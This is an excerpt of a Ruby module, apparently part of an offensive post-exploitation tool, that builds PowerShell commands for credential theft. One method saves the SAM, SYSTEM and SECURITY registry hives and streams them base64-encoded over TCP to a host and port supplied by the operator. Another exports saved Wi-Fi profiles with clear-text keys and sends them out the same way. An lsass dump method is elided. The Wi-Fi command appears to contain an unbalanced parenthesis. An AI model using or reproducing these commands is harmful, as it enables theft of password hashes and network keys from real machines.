...
module PowershellCommands
  ...
  def powershell_hash_dump(host,port)
    powershell_command = "$folder='#{reg_folder}';rm -r $folder;mkdir $folder;reg.exe save HKLM\\SAM #{reg_folder}sam;reg.exe save HKLM\\SYSTEM #{reg_folder}sys;reg.exe save HKLM\\SECURITY #{reg_folder}sec;$files=dir $folder;foreach($file in $files){$reg_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($file.FullName));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine($file);$writer.flush();$writer.WriteLine($reg_file);$writer.flush();$socket.close()}"
    return powershell_command
  end
  def powershell_lsass_dump(host,port,random_name)
  ...
  def powershell_wifi_dump(host,port,directory = 'wifi_dir')
    powershell_command = "$savedir='c:\\windows\\temp\\#{directory}\\';rm -r $savedir;mkdir $savedir;netsh wlan export profile folder=$savedir key=clear;$files=dir $savedir;foreach($file in $files){$xml=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($file.FullName);$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine($file);$writer.flush();$writer.WriteLine($xml);$writer.flush();$socket.close()}"
    return powershell_command
  end
end
